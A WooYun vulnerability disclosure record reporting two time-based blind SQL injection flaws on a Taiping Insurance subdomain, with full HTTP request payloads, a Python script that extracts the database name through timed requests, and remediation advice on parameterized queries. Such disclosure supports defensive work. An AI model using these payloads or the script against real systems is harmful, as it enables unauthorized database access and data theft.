{"id": 88497, "wybug_id": "wooyun-2016-0212032", "wybug_title": "太平保险某站SQL注入2处root权限(MYSQL 附测试脚本)                                      ", "wybug_corp": "cntaiping.com", "wybug_author": "路人甲", "wybug_date": "2016-05-23 15:59", "wybug_open_date": "2016-07-08 14:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-08：\t细节向公众公开  简要描述： 当用户可控的数据未经过恰当的处理就进入了数据库执行的SQL语句中时，就可能存在SQL注入漏洞。攻击者可以定制特定的字符来改变SQL语句的语义。通过SQL注入漏洞可以造成多种危害，包括读取或者修改应用的数据，改变程序逻辑，提升权限和执行操作系统命令等。 详细说明：  1、漏洞触发页面以及对应功能:~~www.tpre.cntaiping.com/index.php/Home/Show/index/cid/20/id/2、漏洞复现具体流程，包含具体payload和完整的数据包：\nGET /index.php/Home/Show/index/cid/20/id/(select(0)from(select(sleep(0)))v)/*'%2b(select(0)from(select(sleep(0)))v)%2b'%22%2b(select(0)from(select(sleep(0)))v)%2b%22*/ HTTP/1.1X-Requested-With: XMLHttpRequestReferer: www.tpre.cntaiping.comCookie: PHPSESSID=rko1m2novndqh69v8fau0uusv4; lang=zh_hkHost: www.tpre.cntaiping.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*\n2,\nGET /index.php/Show/index/cid/20/id/if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/ HTTP/1.1X-Requested-With: XMLHttpRequestReferer: www.tpre.cntaiping.comCookie: PHPSESSID=rko1m2novndqh69v8fau0uusv4; lang=zh_hkHost: www.tpre.cntaiping.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25Accept: */*\n   漏洞证明：  数据库相关信息证明,仅证明，未存储下载任何敏感信息\n\n\n\n\n\n测试脚本：\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {}payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'print '[%s] Start to retrive MySQL User:' % time.strftime('%H:%M:%S', time.localtime())user = ''for i in range(1, 21):    for payload in payloads:        try:            s = \"ascii(mid(lower(database()),%s,1))=%s\" % (i, ord(payload))            s = \"if(%s,sleep(5),0)\" % s            conn = httplib.HTTPConnection('www.tpre.cntaiping.com', timeout=5)            conn.request(method='GET',url=\"/index.php/Home/Show/index/cid/20/id/%s\" % urllib.quote(s))            conn.getresponse()            conn.close()            print '.',        except:            user += payload            print '\\n[in progress]', user,            time.sleep(5.0)            break        print '\\n[Done] MySQL user is %s' % user\n   修复方案：  最有效的防御SQL注入的方式是在所有的数据库操作上使用参数化查询（也被称为预编译)。预编译通过两步把可能存在危害的数据整合到SQL查询中。第一步，应用定义查询语句的结构，在语句中预留位置给用户输入。第二部，应用把每个位置需要的用户输入传递给数据库。因为第一步中，应用已经定义了语句的结构，数据库已经对语法进行了编译，第二部中及时传入恶意的用户输入也无法影响SQL语句的语意，从而避免了SQL注入攻击。对于不同的数据库和编程语言需要查询文档，寻找合适的api。强烈建议使用参数化处理SQL语句中的每一个变量。需要注意的是以下一些防御SQL注入的方式并不总是有效的，所以不建议大家使用以下的方式防御SQL注入：一种常见的方式是在用户数据拼接到SQL语句之前转义其中的单引号。这是为了避免用户插入单引号，改变了SQL的语法。但是如果变量类型是数字型，这种防御就可能失败。因为SQL语句结构中并没有单引号包裹变量的话，仅仅使用空格就可以改变语法结构。另一种常见的防御方案是使用存储过程。尽管存储过程提供了很多安全特性，但是并不能保证防御SQL注入。当存储过程中可以动态创建SQL结构的时候就可能会发生SQL注入。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-05-24 13:54 厂商回复： 漏洞已确认，感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-23 16:42 |    \t\t态度看世界 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 利益我可以把它做到更大)\t\t \n  牛，真厉害     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}